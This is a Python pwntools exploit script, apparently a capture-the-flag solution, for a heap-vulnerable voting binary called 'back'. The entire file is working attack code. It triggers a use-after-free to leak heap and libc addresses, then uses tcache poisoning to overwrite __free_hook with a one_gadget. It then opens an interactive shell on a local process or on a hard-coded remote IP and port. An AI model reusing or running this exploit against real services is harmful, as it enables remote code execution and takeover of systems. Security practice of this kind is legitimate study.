from pwn import *
import sys

remote_ip,port = '69.90.132.248', 3371
binary = './back'
brkpts = '''
'''

context.arch = "amd64"
#context.log_level = 'debug'

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary,env = {"LD_PRELOAD" : "./libc.so.6"})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def choice(idx):
    sla("> ",str(idx))

def vote(employed, age, gender, state, person):
    choice(5)
    sla("(y/n)?\n", employed)
    sla("age?\n", str(age))
    sla("gender?\n", gender)
    sla("live?\n", state)
    sla("vote?\n", person)
    ru("ID is ")
    return ru(".").replace(".","")

def gender(id, value):
    choice(4)
    sla("ID: ", str(id))
    ru("Old gender: ")
    data = rl().replace("\n","")
    sla("gender?\n", value)
    return data

def delete(id):
    choice(3)
    sla("ID: ",str(id))

def viewstats():
    choice(2)

def viewresults():
    choice(1)

if __name__== "__main__":
    id = vote("y", 10, "m"*50, "a"*50, "b"*50)
    log.info(id)
    delete(id)
    heap = u64(gender(id, "new")[8:12].ljust(8,"\x00"))-0x10
    log.info("Heap base : "+hex(heap))
    id2 = vote("y", 10, "m"*0x500, "a"*50, "b"*50)
    delete(id2)
    libc = u64(gender(id2, "new")[8:16])-0x3ebca0
    gadgets = [0x4f3d5, 0x4f432, 0x10a41c, 0xe5617, 0xe561e, 0xe5622]
    gadget = libc + gadgets[2]
    system = libc+0x4f550
    hook = libc+0x3ed8e8
    got = 0x417fd0
    log.info("Leak : "+hex(libc))
    id2 = vote("y", 10, "0"*0x50, "a", "b")
    id3 = vote("y", 10, "1"*0x50, "a", "b")

    delete(id2)
    delete(id3)
    gender(id3,p64(hook))
    id4 = vote("y", 10, "a"*0x50, "a", "b")
    log.info(hex(gadget))
    payload = (p64(gadget)+"\x00"*7+"\x1c")*10
    #gdb.attach(io)
    choice(5)
    sla("(y/n)?\n", 'y')
    sla("age?\n", str(10))
    sla("gender?\n", payload)
    io.interactive()
